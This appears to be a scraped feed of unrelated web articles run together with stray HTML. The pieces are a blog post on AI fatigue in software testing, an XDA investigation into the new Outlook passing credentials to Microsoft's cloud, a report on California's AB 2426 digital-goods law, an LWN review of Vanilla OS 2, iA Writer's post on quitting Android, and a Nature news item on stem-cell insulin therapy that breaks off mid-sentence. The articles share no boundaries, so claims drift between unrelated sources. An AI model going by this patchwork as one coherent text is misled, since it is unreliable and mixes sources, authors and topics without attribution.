    <p>Unless you have been living under a rock for the last few years, you probably have seen the same massive surge I’ve seen in the application of artificial intelligence (AI) to pretty much every problem out there, in software testing, in software development, and in life in general.</p>

<p>Now, I am all for finding and developing new solutions to existing problems, but boy, am I tired of AI, of how it is used and of how it is marketed.</p>

<p>Every tech fart smelling of ‘AI’ these days is almost instantly labeled as a ‘game changer’, only to be replaced by the next ‘pivotal’ and ‘revolutionary’ ‘solution’ the next week.</p>

<p>Yes, I realize that thinking like this and writing this make me a <a href="https://en.wikipedia.org/wiki/Neo-Luddism" target="_blank">Neo-Luddite</a> in your eyes. That’s fine. Everybody is entitled to their opinion, and this is mine. Feel free to stop reading if you’re not interested.</p>

<p>Please note that I don’t necessarily have anything against AI itself. I’m pretty sure that there are some areas where applying AI might be useful. I use AI myself, too, albeit sparingly and with caution. That doesn’t change the fact that I’m really, really tired of most of it.</p>

<p>Allow me to elaborate.</p>

<h3 id="i-am-tired-of-ai-as-a-professional-in-software-testing">I am tired of AI as a professional in software testing</h3>

<p>I’ve been working in testing, with a focus on test automation, for some 18 years now. In that time, several things have changed, but there is a lot that has remained pretty much the same. Full-stack end-to-end tests have always been the slowest and most expensive. To address that challenge, discussing testability has always been a cornerstone in enabling the writing of faster, smaller tests. After that, writing good automated tests has always required a working knowledge of good fundamental programming principles.</p>

<p>There are no shortcuts to solving these problems, it takes time and experience to tackle them. Simply throwing more tools at the problem hasn’t helped so far. Yet, that’s exactly what many ‘AI-powered test automation solutions’ and similar buzzword bingo high score contenders do.</p>

<p>If anything, these tools will produce results faster. Sometimes, that’s exactly what you’re looking for. Often, what we would really benefit from, though, is <em>better</em> results, not merely <em>faster</em> results, and I’ve not seen a lot of AI-powered tools actually produce <em>better</em> results, if any at all.</p>

<p>Again, that doesn’t mean I never use AI in my work. Of course it doesn’t. If it helps me to get a result, or a suggestion towards to result, faster than using other methods, I’ll gladly use AI to do just that. But that’s exactly what AI is: a means to produce some result of indeterminate quality and value faster. I’ll still need to apply my own knowledge and experience to determine the usefulness of a result, and often also to wrangle the output so that it is actually usable. Are those AI-generated results helpful in certain cases? Absolutely. Do I trust it enough to replace what a skilled and experienced human being does? Absolutely not.</p>

<p>But I guess that doesn’t make for sexy marketing material.</p>

<h3 id="i-am-tired-of-ai-as-a-conference-program-committee-member-and-organizer">I am tired of AI as a conference program committee member and organizer</h3>

<p>Over the last few years, I’ve had the honour of being the member of the program committee for three different conferences, and a one-off reviewer for one or two more. What I have seen in these years is a significant rise in proposals that were clearly written with the help of, or in many cases, entirely by ChatGPT or similar software.</p>

<p>Is that a bad thing? Yes, I think it is, for multiple reasons.</p>

<p>First of all, all these auto-generated proposals sound very much the same. ‘In the ever-changing world of …’. ‘Delve’. ‘Pivotal’. All words and phrases that smell suspiciously like someone used ChatGPT to write a proposal, instead of taking the time and effort to do it themselves. I don’t think that’s a great way to stand out and demonstrate your knowledge or experience of or unique take on a subject.</p>

<p>Second of all, a proposal is your first, and often only, opportunity to show use who <em>you</em> are, and what <em>your</em> experience with or opinion on a certain topic is. Why on earth would you want to outsource that opportunity to a piece of software and reduce your unique and thoughtful ideas to a piece of run-of-the-mill text that’s dull as dishwater and about as impressive?</p>

<p>Third of all, if you can’t even write a proposal yourself, why on that same earth would we as the program committee trust you to come up with a unique presentation? Or are you just going to read prompt results out loud for 40 minutes, too? I hope not, but we will not take the chance.</p>

<p>It has gotten so bad that I, for one, immediately reject a proposal when it is clear that it was written by or with the help of AI, no matter how interesting the topic is or how good of a talk you will be able to deliver in person. I’m not taking the chance if you don’t put in the effort of writing a good proposal yourself, and I am pretty confident I’m not the only conference program committee member thinking that way.</p>

<h3 id="i-am-tired-of-ai-as-a-human-being">I am tired of AI as a human being</h3>

<p>Finally, and most of all, I am tired of AI as a human being.</p>

<p>Like so many people, I love listening to good music. Reading a moving book. Watching a captivating movie. What makes these pieces of music, books and movies so attractive is the fact that they are created by human beings, and that these human beings transported their thoughts, their feelings and their emotions to the sheet music, the book manuscript or the movie script.</p>

<p>There’s no way that creative process and the result can be replicated by AI, or at least, I haven’t seen it.</p>

<p>What I have seen, though, is a <em>lot</em> of dull AI-generated posts on social media, with dull AI-generated images, and even more dull AI-generated comments.</p>

<p>I’ve seen and heard examples of texts, videos and music that were generated by AI, and while technically impressive, it doesn’t even begin to evoke the same kind of emotional reaction in me that pieces of art and other human creations can, unless you count boredom as an emotion.</p>

<p>Meanwhile…</p>

<ul>
  <li>people are scared that AI is going to take their jobs</li>
  <li>companies continue to blindly throw ridiculous sums of money towards the next AI prodigy without ever seeing a decent ROI, and</li>
  <li>AI’s carbon footprint is reaching more alarming levels every day</li>
</ul>

<p>I honestly don’t think we’re moving in the right direction this way.</p>

<p>Again, there are <em>some</em> cases where AI is used as a force for good. Early detection of diseases, for example. That’s great. That’s progress. We should definitely keep using AI to do that, and try to make it even better.</p>

<p>But I’m pretty sure I can do without all that AI-generated music, images, text, conference proposals, test cases, LinkedIn posts and so much other AI-generated nonsense.</p>

<p>Microsoft recently introduced a <a href="https://techcommunity.microsoft.com/t5/outlook-blog/new-outlook-for-windows-now-available/ba-p/3932068">new version of Outlook</a> on <a href="https://www.xda-developers.com/best-laptops/">Windows PCs</a>. It was designed to replace the aging Windows Mail and the classic Outlook, so it introduces a slick new design and significantly tighter cloud integrations while combining your email and calendar into one app. It also introduces new generative AI features, including writing assists and “other advanced AI features."</p>    <!-- Not injecting Ads due to No-Ads mode. --><!-- Not injecting Ads due to No-Ads mode. -->
<p>However, the app also introduces some serious privacy concerns. Based on research from the German blog <a href="https://www.heise.de/news/Microsoft-lays-hands-on-login-data-Beware-of-the-new-Outlook-9358925.html">heise.de</a>, which we’ve been able to reproduce at XDA, it appears that the new Outlook app is far more tightly integrated with the cloud than a user might expect, opening up the scope of potential Microsoft data collection. This represents a significant privacy issue, so there are a lot of questions Microsoft needs to answer about user expectations.</p>    <!-- Not injecting Ads due to No-Ads mode. --><h2 id="what-you-can-expect-from-the-new-outlook">

<p>The new version of Outlook has been available since early September and introduces a range of new features. The app already includes <a href="https://www.xda-developers.com/microsoft-copilot-offline-outlook-windows/">new Copilot AI features</a>, and Microsoft has stated that it intends for the new version of Outlook to replace the existing Outlook app within two years. The company has also announced a broader list of <a href="https://techcommunity.microsoft.com/t5/outlook-blog/things-to-look-forward-to-in-the-new-outlook-for-windows/ba-p/3975602">upcoming features</a>, which will likely be announced in the coming months (particularly around AI capabilities). The new app also has a fresh UI, bringing it more in line with Microsoft's cloud versions of office apps, as well as tighter integration with other Office services such as Calendar and Word.</p>    
<p>The new version of Outlook is available on the Microsoft Store now as Outlook for Windows. Once installed, the app in the start menu as Outlook (new).</p>    <h2 id="the-new-outlook-has-problematic-behavior">

<p>When opening the new Outlook client for the first time, the user is asked to log in much like any other email client. If you enter an email address with a common provider, like Gmail or iCloud, the client will use an Oauth2 workflow to authenticate with your browser. If you enter a third-party domain, you'll be prompted for an IMAP password (if supported). This is all very normal for an email client.</p>    
<p>However, once you're authenticated, you're presented with an innocuous window informing you that to use the new version of Outlook, Microsoft will need to sync your emails, events, and contacts to Microsoft Cloud. A cancel option is available, but there's no option to refuse and continue using your client.

<p>From this warning, a user might reasonably assume that the email client they're logging into will continue acting as an email client and that the client might send some limited data for processing in the cloud. However, that's not the case. Instead of your email client authenticating, your credentials are passed to the Microsoft cloud, which authenticates on your behalf. From this point, all processing (including the fetching of your emails) is handled in the cloud. We could not observe any traffic traveling directly from the client to our email provider.</p>    
<p>This is true of both OAuth and IMAP workflows but is most visible when authenticating with a third-party IMAP server. In this case, the Outlook client takes the IMAP credentials provided by your email provider to access the application and transfers them directly to Microsoft's cloud over TLS. We could reproduce this by setting up a transparent man-in-the-middle proxy between the internet and the Outlook Client to intercept encrypted traffic. In the screenshot below, our app password generated from a third-party email provider is shared and stored directly with Microsoft's servers. The response to this request is an access and refresh token that's used to maintain a persistent authenticated session with Microsoft's servers.</p>

            Outlook (new) does less locally than you might think

<p>The email provider we're using for this example records the IP address and access time of each new login. If the Outlook client was communicating directly with our mail server (i.e. acting like a client should), then the IP address the email provider records should be the same as the computer we're running Outlook on. In each case we tried this, no connection was recorded from our home IP address. Instead, the initial IMAP/SMTP connections came from a 52.x.x.x IP address. A quick WHOIS lookup shows that this IP address is registered with Microsoft. This would demonstrate that the Outlook "client" is nothing of the sort, acting entirely as a wrapper around Microsoft's cloud services and that our local client has never actually logged in at all.</p>

<p>There is a clear problem for the user here. By simply signing in to the new Outlook client, a user has effectively provided the Microsoft Cloud with blanket and unrestricted access to their entire email account. Microsoft's only mention of privacy on the linked support page is a set of links to its privacy statement and service agreements, both of which allow for blanket access to your data for improving Microsoft products and services. At least when authenticating with OAuth2, most email providers offer some kind of privacy summary (similar to the example from Google below). When authenticating with IMAP, a user is normally given even less warning, with most email providers assuming that email "clients" are at least acting as clients, not gateways to the cloud. It's also important to note that there's no obvious way to decline this cloud integration when logging into any email account or use the client in a mode with some AI features disabled.</p>

<p>The offloading of the client functionality of email to the cloud also removes the ability for security engineers or researchers to easily inspect what the client is doing. It's possible to track the requests made on your data from Microsoft (albeit tricky, as a user would need to run their own email server with access to its logs), but this doesn't allow for any indication as to how much additional processing, if any, is taking place. It's also important to remember that this access is ongoing. It's no longer possible to stop Microsoft's access to your emails by simply closing Outlook. Users may log in to Outlook on their desktop to test it out, decide they don't like it, and simply stop using it without signing out. Until the user does sign out (or revokes the session elsewhere), Microsoft will retain ongoing access to their data.</p>    <h2 id="dangerous-precedents-for-data">
                        Dangerous precedents for data

            Shoehorning data collection into local clients may be a step too far
    </h3>

<p>Data collection is, ultimately, something we're all accustomed to, whether we like it or not. However, the lack of transparent disclosure here from Microsoft and the piggybacking of desktop apps to get users' data into the cloud are concerning. Microsoft's subtly accepted licensing agreements allow almost unlimited data collection for the improvement or creation of new Microsoft tools, including using your email data to train generative AI or other tools.</p>    
<p>It's not made clear at any point that the Outlook desktop app will be acting as a wrapper around exclusively cloud services or what the limits and circumstances are under which Microsoft will access your data in the cloud. Given the scope of Microsoft's push into new cloud-based AI integrations and the lack of assurance otherwise, it's reasonable to assume Microsoft may be using this kind of data for training or testing purposes.</p>

    </div>
<p>This may also be a serious problem for businesses. A corporate end user could unwittingly provide Microsoft access to large volumes of business or commercially sensitive data, possibly in breach of regulatory or security requirements. If this data was then used to train generative AIs or other machine learning models that are publicly released, it's possible that some aspects of that data could be surfaced for anyone to access. This is an extreme scenario, but it's clear where concerns might lie.</p>    
<p>Whether you're a power user in business, a systems administrator overseeing a network, or an end user looking for a new email client, it's important to know the privacy implications of signing in with Outlook. Microsoft, while offering a disclosure that it will sync data to the cloud, is taking far greater liberties than a user would reasonably expect with the extent of their access and the client's role at all.</p>    </div></div>]]></description>

<p>California recently became the first state to ban deceptive sales of so-called "disappearing media."</p>
<p>On Tuesday, Governor Gavin Newsom <a href="https://www.gov.ca.gov/2024/09/24/governor-newsom-signs-consumer-protection-bills-targeting-medical-debt-overdraft-fees-and-unfair-subscription-practices/">signed</a> AB 2426 into law, protecting consumers of digital goods like books, movies, and video games from being duped into purchasing content without realizing access was only granted through a temporary license.</p>
<p>Sponsored by Democratic assemblymember Jacqui Irwin, the law makes it illegal to "advertise or offer for sale a digital good to a purchaser with the terms buy, purchase, or any other term which a reasonable person would understand to confer an unrestricted ownership interest in the digital good, or alongside an option for a time-limited rental."</p>
<p>Moving forward, sellers must clearly mark when a buyer is only receiving a license for—rather than making a purchase of—a digital good. Sellers must also clearly disclose that access to the digital good could be revoked if the seller no longer retains rights to license that good.</p>
<p>Perhaps most significantly, these disclosures cannot be buried in terms of service, but "shall be distinct and separate from any other terms and conditions of the transaction that the purchaser acknowledges or agrees to," the law says.</p>
<p>An exception applies for goods that are advertised using "plain language" that states that "buying or purchasing the digital good is a license." And there are also carve-outs for free goods and subscription services providing limited access based on a subscription's duration. Additionally, it's OK to advertise a digital good if access isn't ever revoked, such as when users purchase a permanent download that can be accessed offline, regardless of a seller's rights to license the content.</p>                                                                        
                                                                                
<h2>Ubisoft, Sony called out for consumer harms</h2>
<p>In a <a href="https://a42.asmdc.org/press-releases/20240916-assemblymember-irwin-urges-governor-sign-legislation-increasing">press release</a> earlier this month, Irwin noted that the law was drafted to "address the increasingly-common instance of consumers losing access to their digital media purchases through no fault of their own."</p>
<p>She pointed to <a href="https://www.engadget.com/ubisoft-is-deleting-the-crew-from-players-libraries-reminding-us-we-own-nothing-165328083.html">Ubisoft revoking licenses</a> for purchases of its video game<em> The Crew</em> last April and Sony stirring backlash by <a href="https://arstechnica.com/gadgets/2023/12/playstation-is-erasing-1318-seasons-of-discovery-shows-from-customer-libraries/">threatening to yank access to Discovery TV shows</a> last year as prominent examples of consumer harms.</p>
<p>Irwin noted that the US has been monitoring this problem since at least 2016, when the Department of Commerce’s Internet Policy Task Force published a <a href="https://www.ntia.gov/sites/default/files/publications/white_paper_remixes-first_sale-statutory_damages_jan_2016_0.pdf">white paper</a> concluding that "consumers would benefit from more information on the nature of the transactions they enter into, including whether they are paying for access to content or for ownership of a copy, in order to instill greater confidence and enhance participation in the online marketplace."</p>
<p>It took eight years for the first state lawmakers to follow through on the recommendation, Irwin said, noting that sellers are increasingly licensing content over selling goods and rarely offer refunds for "disappearing media."</p>
<p>"As retailers continue to pivot away from selling physical media, the need for consumer protections on the purchase of digital media has become increasingly more important," Irwin said. "AB 2426 will ensure the false and deceptive advertising from sellers of digital media incorrectly telling consumers they own their purchases becomes a thing of the past."</p>
<p>In Irwin's press release, University of Michigan law professor Aaron Perzanowski praised California for trailblazing with a law that clearly labels this practice as false advertising.</p>
<p>"Consumers around the world deserve to understand that when they spend money on digital movies, music, books, and games, those so-called ‘purchases’ can disappear without notice," Perzanowski said. "There is still important work to do in securing consumers’ digital rights, but AB 2426 is a crucial step in the right direction."</p>

<p><a href="https://vanillaos.org/">Vanilla OS</a>, an immutable desktop
Linux distribution designed for developers and advanced users, has
recently published its <a href="https://vanillaos.org/blog/article/2024-07-28/vanilla-os-2-orchid---stable-release">2.0
"Orchid" release</a>. Previously based on Ubuntu, Vanilla OS has now
shifted to Debian unstable ("sid"). The release has made it easier to
install software from other distributions' package repositories, and it
is now theoretically possible to install and run Android applications as well.</p>

<p>The idea behind Vanilla OS is to maintain a small, immutable core
operating system while isolating additional software from that core
through containerization or sandboxing. The core of Vanilla OS is based
on <a href="https://opencontainers.org/">Open Container Initiative</a>
(OCI) images composed of packages from Debian sid. These images are
updated and managed by the <a href="https://abroot.vanillaos.org/">ABRoot</a> utility. Rather than
handling system updates through a package manager, Vanilla OS
downloads a new OCI image, and then uses the new image when it
reboots. This is similar to other image-based operating systems, like
<a href="https://lwn.net/Articles/977987/">Aeon</a> and <a href="https://lwn.net/Articles/954059/">Bluefin</a> that use <a href="https://source.android.com/docs/core/ota/ab">A/B image
update</a> strategies—though each distribution has its own
method of doing so. All of this happens under the hood, so users don't
have to be aware of how updates work.</p>

<p>One of the reasons that Vanilla OS <a href="https://lwn.net/Articles/929124/">shifted from Ubuntu to
Debian</a> was that the latter offers a more vanilla GNOME experience by
providing the software without significant customizations. As the
project's <a href="https://vanillaos.org/blog/article/2023-03-07/vanilla-os-20-orchid---initial-work">announcement</a>
from last year said:

</p><blockquote>
Ubuntu provides a modified version of the GNOME desktop, that does not
match how GNOME envisions its desktop. One of the high-level goals of
Vanilla OS is to be as vanilla as possible, so we reverted many of
these changes to reach that goal.
</blockquote>

<p>Another concern cited in the announcement was Ubuntu's
reliance on the <a href="https://ubuntu.com/core/services/guide/snaps-intro">Snap</a> packaging
format, with problems like slow startups and Canonical's control over the
official <a href="https://snapcraft.io/">Snap store</a>.</p>

<h4>Installing the system and applications</h4>

<p>The project offers an <a href="https://vanillaos.org/download/orchid/stable">ISO image</a> for
x86-64 systems, with no support for other architectures. Only UEFI systems are
supported, and even on those systems, the installer seems quite finicky.
On two physical test machines, the installer seemed to run fine until it
aborted with a generic error message. I managed to install Vanilla OS in
a virtual machine (using <a href="https://apps.gnome.org/Boxes/">GNOME Boxes</a>) only after selecting Debian testing
as the operating system (and choosing UEFI, of course).</p>

<p>When the installer works, it is straightforward to use. After the first reboot, a
configuration wizard guides the user through creating an account and
selecting applications to install. After a second reboot, the user is
prompted to choose a password, followed by the installation of the
selected applications using <a href="https://flatpak.org/">Flatpak</a>.</p>

<p>Upon installation of these applications, a stock GNOME desktop
environment appears. The recommended way to install applications in
Vanilla OS is through the GNOME application <a href="https://apps.gnome.org/Software/">Software</a>, which is
configured to install applications as Flatpaks from <a href="https://flathub.org/">Flathub</a>. By default, Flatpaks installed
this way are updated automatically. Vanilla OS also checks for system
updates weekly, by default. Users can change this to daily, weekly, or
never if they choose. To minimize any impact on the user experience, the
updater considers factors such as system load, battery level, and
network connection before applying system updates. With the core operating system
and applications set for automatic updates, Vanilla OS aims to relieve
users of the often tedious task of keeping all packages updated.</p>

<h4>Installing non-Flatpak packages</h4>

<p>Although Flatpak has gained popularity, many applications are still
not available as Flatpaks. Given that Vanilla OS is based on Debian,
users might be tempted to install a <tt>.deb</tt> package directly into the core
operating system when there's no Flatpak version for it. However,
Vanilla OS doesn't offer that possibility. It addresses the need for
Debian packages with the <a href="https://vanillaos.org/blog/article/2024-07-16/discover-vso-v2-managing-your-vanilla-os-installation-like-never-before">Vanilla
System Operator</a> (VSO v2), a container where users can safely install
any <tt>.deb</tt> package.</p>

<p>VSO integrates software installed in a container with the desktop
so that it appears just like any other desktop application. After downloading a <tt>.deb</tt>
package, double-clicking on the file in the <a href="https://apps.gnome.org/Nautilus/">GNOME Files</a> application
launches the <a href="https://github.com/Vanilla-OS/sideload-utility">Sideload</a> utility, which installs the <tt>.deb</tt> package into
the VSO container. Once installed, the application is displayed among
other applications in GNOME's activities overview.
Launching the application runs it in a container, isolated from the
operating system but integrated with the user's home directory. Thus, an
application installed via a <tt>.deb</tt> package behaves similarly to one
installed via Flatpak.</p>

<p>There's also a command-line method for installing <tt>.deb</tt> files. The
default terminal emulator in Vanilla OS is <a href="https://gitlab.gnome.org/raggesilver/blackbox">Black Box</a>. When
launched, this application takes the user to a shell within the VSO
container rather than the core operating system. Packages can be
installed in this container using Debian's <tt>apt</tt> package manager.</p>

<p>This method is also useful for troubleshooting dependency issues. For
instance, I decided to install an open-source ChatGPT alternative
called <a href="https://jan.ai/">Jan</a> on Vanilla OS. 
When I attempted to install its <tt>.deb</tt> package with Sideload, the
application failed to start without any
clear indication of what was wrong. Opening Black Box and running the
<code>jan</code> command in the shell revealed an error message
regarding a missing library: <tt>libasound2.so</tt>. It turned out that Jan's
<tt>.deb</tt> package didn't list this library as a dependency. After executing
<code>sudo apt install libasound2</code> in Black Box, I was able to run
Jan successfully.</p>

<p>Vanilla OS offers a similar method for installing Android apps by
running them in a <a href="https://waydro.id/">Waydroid</a> container.
However, the developers caution that this is still an experimental
feature. I was able to initialize the Android subsystem with
<tt>vso android init</tt> in the VSO shell but encountered issues
when trying to manually open an Android <tt>.apk</tt> file with Sideload. Despite
several troubleshooting attempts, I was unable to get the Android
functionality running. This was possibly due to my test system running
in a virtual machine, a scenario that the project has not tested.</p>

<h4>Linux subsystems</h4>

<p>While VSO is the default container in Vanilla OS, the operating
system allows users to install separate "subsystems" based on various
Linux distributions through <a href="https://docs.vanillaos.org/docs/en/apx-manpage">Apx</a>, a wrapper
around <a href="https://distrobox.it/">Distrobox</a>. The latter, in
turn, is a wrapper around <a href="https://podman.io/">Podman</a>, <a href="https://www.docker.com/">Docker</a>, or the simple container
manager <a href="https://github.com/89luca89/lilipod?tab=readme-ov-file">lilipod</a>
to create containers that are highly integrated with the host operating
system. Incidentally, Luca Di Maio, the creator of Distrobox and
lilipod, is also part of the <a href="https://vanillaos.org/team">Vanilla OS team</a> and one of its
co-founders.</p>

<p>Vanilla OS includes a graphical user interface for Apx, enabling
users to easily create a subsystem based on a <a href="https://docs.vanillaos.org/handbook/en/install-and-manage-applications#installing-applications-from-other-linux-distributions">stack</a> (Alpine, Arch
Linux, Fedora, openSUSE, Ubuntu, and Vanilla OS are supported by
default) and a package manager (apk, apt, dnf, pacman, or zypper). After
creating and starting the subsystem, the user can search its packages
and install them using commands in the VSO shell, such as:

</p><pre>    <tt>apx gecko search qucs</tt>
    <tt>apx gecko install qucs-s</tt>
</pre>

<p>Here <tt>gecko</tt> is the name I gave to the subsystem in this example, based on an openSUSE
container.</p>

<p>Applications installed this way are "<a href="https://github.com/89luca89/distrobox/blob/main/docs/usage/distrobox-export.md">exported</a>",
which is a feature of
Distrobox. The application then appears in GNOME's activities overview.
When clicking on the icon, the subsystem's container is automatically
started, and the application launches. This provides an easy way to
install software available in specific distribution repositories.
Furthermore, the <tt>apx</tt> package management commands are
consistent, regardless of the underlying package manager, so users don't
need to remember the differences between apt, dnf, or zypper, for
example.</p>

<blockquote>
<a href="https://lwn.net/Articles/990072/">
<img src="https://static.lwn.net/images/2024/vanillaos-software-and-apx-sm.png" alt="[Vanilla OS 2 screenshot]" title="Vanilla OS 2 screenshot"></a>
</blockquote>

<p>Apx offers a lot of flexibility. Users can add other package
managers, such as <a href="https://github.com/Jguer/yay#yay">yay</a>
instead of pacman for an Arch Linux subsystem. This involves mapping
each <tt>apx</tt> package management command to the corresponding
<tt>yay</tt> command. Similarly, users can create their own stack by
referencing an image from one of the well-known container repositories.
A stack can also have a list of pre-installed packages. This is useful
for setting up a complete <a href="https://docs.vanillaos.org/handbook/en/develop-in-vanilla-os">development stack</a> in a container.</p>

<h4>Development and documentation</h4>

<p>Development is happening in the <a href="https://github.com/Vanilla-OS">Vanilla OS GitHub organization</a>,
which has 24 members. Its <a href="https://github.com/orgs/Vanilla-OS/repositories">more than 100
repositories</a> include numerous container files and various custom
tools. Although many of these tools were specifically created for Vanilla
OS, the developers try to make them as distribution-independent as
possible. For instance, there are instructions for <a href="https://github.com/Vanilla-OS/apx?tab=readme-ov-file#instructions-for-using-apx-in-other-distributions">using
Apx in other distributions</a>.</p>

<p>There's no fixed release cadence, but the <a href="https://vanillaos.org/components-lifecycle">lifecycle</a> of
Vanilla OS is clear: when a major version is released, the previous
major release enters the maintenance state. This means that it only gets
important bug fixes and security fixes. After six months in the
maintenance state, the release is declared end of life. <a href="https://vanillaos.org/updates">Updates</a> are released at
irregular intervals with detailed descriptions of bug fixes and
enhancements. The project does not have a separate
security-announcement list.</p>

<p>The transition from Vanilla OS 1 to 2 was significant, not only due
to the shift from an Ubuntu base to Debian, but also because tools like
ABRoot, VSO, and Apx were completely rewritten. However, the Vanilla OS
documentation site still primarily covers <a href="https://docs.vanillaos.org/docs/en/abroot">ABRoot v1</a>, <a href="https://docs.vanillaos.org/docs/en/vso">VSO v1</a>, and <a href="https://docs.vanillaos.org/docs/en/apx">Apx v1</a>. While the man
pages seem to have been updated, information about the new features in
Vanilla OS 2 remains fragmented, scattered across the project's web
site, <a href="https://vanillaos.org/blog">blog</a>, and GitHub repositories.</p>

<p>Overall, Vanilla OS appears to be a good choice for advanced users
who need applications from multiple distributions without risking
system instability. Major applications can be easily installed as
Flatpaks, while others can be installed in subsystems from various
distributions. Thanks to the tight integration of the VSO and Apx
containers with the host operating system, users can seamlessly work
with all those applications without worrying about the underlying
differences. And when something goes wrong with one of the
applications, the core operating system isn't impacted and the VSO or
Apx container can simply be recreated.</p><br clear="all"><table>

<p>After seven years of trying, the most recent struggle with Google proved that we need to change course on our adventure in the Android galaxy.</p>
<p>A couple of months ago, Google changed its API policy and revoked iA Writer’s access to Google Drive on Android. By freezing up Android’s main storage option, our app was frozen in carbonite. It still lived but we couldn’t move forward before resolving it.</p>
<p>In order to allow our users to access their Google Drive on their phones we had to rewrite privacy statements, update documents, and pass a series of security checks, all while facing a barrage of new, ever-shifting requirements.</p>

<p>By September, we thought we had honored our side of the new agreement. But on the very day we expected to get our access back, Google altered the deal.</p>
<h2>“I’ve altered the deal. Pray that I don’t alter it any further.”</h2>
<p>We were told that read-only access to Google Drive would suit our writing app better than the desired read/write access. That’s right—read-only for a writing app.</p>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/update.png" alt="">
<figcaption><strong>Getting closer:</strong> Ah, not quite. After a series of updates, following exactly Google’s playbook they still want more privacy policy changes. But then, *then*, our customers get Google Drive back. Right… Right?</figcaption>
</figure>
<figure>
<img decoding="async" src="https://ia.net/wp-content/uploads/2024/09/important.png" alt="">
<figcaption><strong>No:</strong> “You don’t really need Google Drive write access, for your writing app, do you?”</figcaption>
</figure>
<h2>“Perhaps you think that you were treated unfairly?”</h2>
<p>When we pointed out that this was not what we had, or what our users wanted, Google seemed to alter the deal yet again. In order to get our users full access to <em>their</em> Google Drive on <em>their</em> devices, we now needed to pass a yearly CASA (Cloud Application Security Assessment) audit. This requires hiring a third-party vendor like KPMG.</p>

</figure>
<p>The cost, including all internal hours, amounts to about one to two months of revenue that we would have to pay to one of Google’s corporate amigos. An indie company handing over a month’s worth of revenue to a “Big Four” firm like KPMG for a pretty much meaningless scan. And, of course, this would be a recurring annual expense. More cash for Google’s partners, while small developers like us foot the bill for Android’s deeply ingrained security shortcomings.<sup id="fnref-27202-scam"><a href="#fn-27202-scam" rel="footnote">1</a></sup></p>
<p>As we… googled… our new situation, it became clear this wasn’t just our battle—developers everywhere were facing similar bureaucratic entanglements, all designed to benefit Google’s partners while squeezing the life out of smaller companies.</p>
<blockquote>
<p>I just finally completed and passed the assessment. Overall it took me about 60-80 hours of my time, and the process itself spanned 3-4 months, with 25-30 back and forth requests of varying complexity. It was awful, and if it’s not streamlined next year, I’ll be dropping this permission from my app and going another route.<sup id="fnref-27202-reddit"><a href="#fn-27202-reddit" rel="footnote">2</a></sup></p>
</blockquote>
<p>So it’s normal. Seems like we had to bite the bullet. After all, we have been doing this for seven years. We have tens of thousands of users. We invested hundreds of thousands to make this works, and so it looks like…</p>
<h2>“We shall double our efforts!”</h2>
<p>This battle to give our customers access to their Google Drive is only the latest in a series of clashes we’ve had with the empire. Developing on Android is a daily worsening struggle with red tape, inconsistent device performance, app store search performance gaming<sup id="fnref-27202-gaming"><a href="#fn-27202-gaming" rel="footnote">3</a></sup>, and rampant piracy.<sup id="fnref-27202-piracy"><a href="#fn-27202-piracy" rel="footnote">4</a></sup></p>
<p>Every time we think we’ve overcome one hurdle, another two pop up. It’s an exhausting process that saps our resources, delays updates, and damages our reputation. Meanwhile, the negative reviews keep piling up for problems that are out of our control. That’s not the only problem.</p>
<p>There are certain devices that cause trouble. To fix the bugs you need to buy the device. Customers demand that. And often we did. Below you can see the 12,000 devices that were using iA Writer in 2017:</p>
<p><img decoding="async" src="https://ia.net/wp-content/uploads/2017/09/iA-Writer-Android-Devices-Galaxy.png"></p><p>Developing for Android you navigate an asteroid field. Bugs surface across thousands of device types, Android versions, and flavors—One UI, MIUI, OxygenOS, Pixel Experience, you name it.</p>
<p>And before anyone says this is the price of an “open” OS—well, we don’t have this problem on Windows.<sup id="fnref-27202-flavor"><a href="#fn-27202-flavor" rel="footnote">5</a></sup></p>
<h2>“Put him in!”</h2>
<p>We could just comply—we could pay KPMG, surrender more of our revenue, and dig ourselves deeper into the red. And then accept the next forced change. And the next one. We could try to write our own framework for payment to avoid piracy. But why would we when no one wants to pay for it? And then what? Where does it end? Hiring someone to game our app reviews?</p>
<p>As long as we sell to Android end consumers, the economics of continuing development on Android is an ever-tightening Force Choke. Bit by bit the control over our app’s functionality, quality, or finances are being taken away from us. If we continue down the current path we damage our relationship with users, taint our reputation, lose money, nerves, and time.</p>
<p>So, as of today, we’re not just accepting our frozen-in-carbonite fate. We’re embracing it. We’re going to take the app offline. We know this decision will disappoint our loyal Android users, and we share your frustration. After seven years of continuous investment, this is way more painful for us than it is for any of you.</p>
<p>It’s important to understand why many developers choose not to engage with the Empire. You can’t win that battle. They do as they please. Existing users will keep their access, and we’ll push critical updates when necessary—if the empire allows it. But new features are off the table for now. Support will be friendly as always, but we have to be pragmatic.</p>
<h2>“What if he doesn’t survive? He’s worth a lot to me!”</h2>
<p>iA Writer for Android might return in the future—perhaps in a different chapter of this saga, where it can develop in a more controlled environment.</p>
<p>We are working towards a setup where organizations can pay us directly for all our software.<sup id="fnref-27202-directly"><a href="#fn-27202-directly" rel="footnote">6</a></sup> In a B2B setup, the Android hardware ecosystem may be economical and manageable, and then we can go back to sponsoring single-license users and their unruly pirate friends. Until that day comes, iA Writer for Android will remain frozen in carbonite, waiting for the right time to reawaken.</p>
<p>In the meantime, we’re focusing on projects that drive our business forward: finalizing a major Windows 11 update, enhancing iA Writer for Mac, iOS, and iPadOS, preparing to launch Web sharing for iA Presenter, and releasing the iOS/iPadOS app.</p>

</figure><p>A 25-year-old woman with type 1 diabetes started producing her own insulin less than three months after receiving a transplant of reprogrammed stem cells<sup><a href="#ref-CR1" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">1</a></sup>. She is the first person with the disease to be treated using cells that were extracted from her own body.</p><p>“I can eat sugar now,” said the woman, who lives in Tianjing, on a call with <i>Nature</i>. It has been more than a year since the transplant, and, she says, “I enjoy eating everything — especially hotpot.” The woman asked to remain anonymous to protect her privacy.</p><p>James Shapiro, a transplant surgeon and researcher at the University of Alberta in Edmonton, Canada, says the results of the surgery are stunning. “They’ve completely reversed diabetes in the patient, who was requiring substantial amounts of insulin beforehand.”</p><p>The study, published in <i>Cell </i>today, follows results from a separate group in Shanghai, China, who reported in April that they had successfully transplanted insulin-producing islets into the liver of a 59-year-old man with type 2 diabetes<sup><a href="#ref-CR2" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">2</a></sup>. The islets were also derived from reprogrammed stem cells taken from the man’s own body and he has since stopped taking insulin.</p><p>The studies are among a handful of pioneering trials using stem cells to treat diabetes, which affects close to half a billion people worldwide. Most of them have type 2 diabetes, in which the body 